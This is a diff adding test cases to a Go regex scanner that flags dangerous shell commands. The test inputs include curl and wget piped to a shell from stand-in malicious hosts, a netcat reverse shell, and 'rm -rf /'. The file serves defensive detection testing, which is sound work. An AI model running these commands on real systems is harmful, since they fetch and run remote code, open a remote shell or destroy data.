@@ -38,6 +38,36 @@ func TestRegexScanner_Scan(t *testing.T) {
 			wantFinding: "Generic API Token",
 		},
 		{
+			name:        "Curl Pipe Bash",
+			content:     "curl https://malicious.com/install.sh | bash",
+			wantFinding: "Pipe to Shell",
+		},
+		{
+			name:        "Wget Pipe Sh",
+			content:     "wget -O - https://malicious.com/install.sh | sh",
+			wantFinding: "Pipe to Shell",
+		},
+		{
+			name:        "Netcat Reverse Shell",
+			content:     "nc -e /bin/sh 10.0.0.1 1234",
+			wantFinding: "Reverse Shell",
+		},
+		{
+			name:        "False Positive: Curl then unrelated pipe",
+			content:     "curl http://example.com; echo 'done' | bash",
+			wantFinding: "",
+		},
+		{
+			name:        "False Positive: Wget then unrelated pipe",
+			content:     "wget http://example.com; cat file | sh",
+			wantFinding: "",
+		},
+		{
+			name:        "Curl Pipe Bash with URL parameters (quoted)",
+			content:     `curl "http://evil.com/setup.sh?token=123&foo=bar" | bash`,
+			wantFinding: "Pipe to Shell",
+		},
+		{
 			name:        "Root Deletion",
 			content:     "rm -rf /",
 			wantFinding: "Root Deletion",
